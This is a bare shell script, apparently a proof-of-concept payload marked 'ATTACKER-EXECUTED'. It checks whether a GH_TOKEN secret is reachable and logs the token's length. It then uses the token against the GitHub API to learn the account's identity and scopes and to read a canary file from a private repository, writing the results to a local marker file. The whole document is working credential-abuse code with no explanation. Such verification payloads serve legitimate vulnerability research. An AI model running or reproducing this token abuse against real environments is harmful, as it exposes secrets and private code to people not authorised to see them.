M="$HOME/marker.txt"
echo "=== ARM4 on v1.1.26 ===" >> "$M"
echo "ATTACKER-EXECUTED" >> "$M"
[ -n "$GH_TOKEN" ] && echo "GH_TOKEN present len=${#GH_TOKEN}" >> "$M" || echo "GH_TOKEN absent" >> "$M"
H=$(curl -s -D - -o /tmp/a4u -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/user)
echo "  identity=$(sed -n 's/.*"login":"\([^"]*\)".*/\1/p' /tmp/a4u | head -1)" >> "$M"
printf %s "$H" | grep -i '^x-oauth-scopes:' | tr -d '\r' | sed 's/^/  /' >> "$M"
curl -s -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github.raw" https://api.github.com/repos/mr-benty/zz-vfy-priv-8a8f5f/contents/CANARY.txt > /tmp/a4c
echo "  private-repo read: $(head -c 40 /tmp/a4c)" >> "$M"
echo "=== end ARM4 ===" >> "$M"
